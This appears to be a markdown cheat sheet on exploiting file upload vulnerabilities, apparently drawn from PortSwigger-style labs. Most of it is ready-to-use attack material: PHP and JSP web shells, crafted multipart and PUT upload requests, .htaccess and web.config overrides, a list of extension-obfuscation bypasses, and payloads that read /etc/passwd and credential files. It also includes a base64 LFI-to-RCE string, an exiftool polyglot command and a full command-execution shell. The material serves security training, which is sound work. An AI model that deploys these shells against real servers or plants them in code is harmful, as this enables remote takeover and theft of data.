# **File Upload Vulnerability**

## **Index**

1. [PHP Web Shell Upload](#1-php-web-shell-upload)  
2. [Image Upload with Embedded PHP Code](#2-image-upload-with-embedded-php-code)  
3. [Bypassing Content-Type Validation](#3-bypassing-content-type-validation)
4. [Uploading Files via Path Traversal Vulnerability](#4-uploading-files-via-path-traversal-vulnerability)  
5. [Uploading Files Using PUT](#5-uploading-files-using-put) 
6. [Exploiting Server Configuration](#6-exploiting-server-configuration)  
     - [Apache Bypass](#apache-bypass)  
     - [IIS Bypass](#iis-bypass)  
7. [Obfuscating File Extensions](#7-obfuscating-file-extensions)
8. [File Content Exploit Via Polyglot](#8-File-Content-Exploit-Via-Polyglot)
9. [SSRF By Uploading Url Instead Of Picture](#9-SSRF-By-Uploading-url-instead-of-picture)
10. [PHP Payloads for RCE](#10-php-payloads-for-rce)
---
### **1. PHP Web Shell Upload**

Uploading a simple PHP script as a file to get remote code execution.

**Malicious File Content (`shell.php`):**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

**Example HTTP Request:**
```http
POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=---------------------------12345
Content-Length: 221

-----------------------------12345
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['cmd']); ?>
-----------------------------12345--
```

In this example, the attacker uploads a file named `shell.php` that contains a PHP web shell. If the server stores the file in a web-accessible location, the attacker can execute commands by accessing `http://vulnerable-website.com/uploads/shell.php?cmd=ls`.

---

### **2. Image Upload with Embedded PHP Code**

Uploading an image file that contains embedded PHP code with a manipulated file extension.

**Malicious File Content (`image.php.jpg`):**
```php
<?php system($_GET['cmd']); ?>
```

**Example HTTP Request:**
```http
POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=---------------------------98765
Content-Length: 245

-----------------------------98765
Content-Disposition: form-data; name="file"; filename="image.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
-----------------------------98765--
```

The attacker uploads a file named `image.php.jpg`. If the server incorrectly identifies the file based on its extension rather than content, the attacker may execute commands by navigating to the uploaded file's URL.

---

### **3. Bypassing Content-Type Validation**

Some web applications check the `Content-Type` header to validate the file type. The attacker can manipulate the header to bypass this check.

**Malicious File Content (`shell.jsp`):**
```jsp
<% out.println("Command execution: " + Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
```

**Example HTTP Request:**
```http
POST /upload HTTP/1.1
Host: vulnerable-website.com
Content-Type: multipart/form-data; boundary=---------------------------54321
Content-Length: 256

-----------------------------54321
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: image/jpeg

<% out.println("Command execution: " + Runtime.getRuntime().exec(request.getParameter("cmd"))); %>
-----------------------------54321--
```

Here, the attacker uploads a JSP file disguised with a `Content-Type` of `image/jpeg`, hoping that the server only checks the header and not the actual content of the file.

---

### **4. Uploading Files via Path Traversal Vulnerability**

In some cases, you can exploit file upload vulnerability via path traversal:  
- `filename="../exploit.php"`  
- URL encoding: `filename="..%2fexploit.php"`

---

### **5. Uploading Files Using PUT**

```text
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```
### **6. Exploiting Server Configuration**

#### **Apache Bypass**
```text
Step 1 >>
filename=".htaccess"
Content-Type: text/plain
AddType application/x-httpd-php .shell

Step 2 >>
filename="test.shell"
Content-Type: application/x-httpd-php
<?php system($_GET['cmd']); ?>
```

#### **IIS Bypass**
```text
Step 1 >>
filename="web.config"
Content-Type: text/plain
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap fileExtension=".php" mimeType="application/x-httpd-php" />
        </staticContent>
    </system.webServer>
</configuration>

Step 2 >>
Content-Type: application/x-httpd-php
<?php system($_GET['cmd']); ?>
```

Reference: [Portswigger Lab Overriding the server configuration](https://portswigger.net/web-security/file-upload#overriding-the-server-configuration)

---

### **7. Obfuscating File Extensions**
```text
.php
.php3
.php4
.php5
.pHp
.shtml
.php.jpg
.php.png
%2Ephp
.php;.jpg
.php;.png  
.php%00.jpg
.php%00.png
.p.phphp
.php.
exploit.asp;.jpg
exploit.asp%00.jpg
```

Reference : [Portswigger](https://portswigger.net/web-security/file-upload#obfuscating-file-extensions)

---

### **8. File Content Exploit Via Polyglot**
<br>

For more details: [Portswigger](https://portswigger.net/web-security/file-upload#flawed-validation-of-the-file-s-contents)

### **9. SSRF By Uploading Url Instead Of Picture**

In some cases we can exploit SSRF via file upload vulnerability. In this case we need to change `type:file to type:url` and add a image url.<br>
<br>
Here is a h1 POC: [Upload profile photo from URL](https://hackerone.com/reports/713)

### **10. PHP Payloads for RCE**

```php
<?php echo exec('sudo cat /root/flag.txt'); ?> // Execute command and give output
<?php echo file_get_contents('/etc/passwd'); ?> // To read files
<?php system($_GET['cmd']); ?> // For system command
<?php passthru($_GET['cyborg71']); ?> // For system command*
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls // LFI to RCE
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
```

### Payloads
```php
<?php
$command = isset($_GET['command']) ? $_GET['command'] : '';
$output = [];
$return_var = 0;
exec($command, $output, $return_var);
echo '<h1>Exploiting RCE</h1>';
echo 'Command: '.$command;
echo '\n<pre>';
echo implode("\n", $output);
echo '</pre>';
?>
```
---


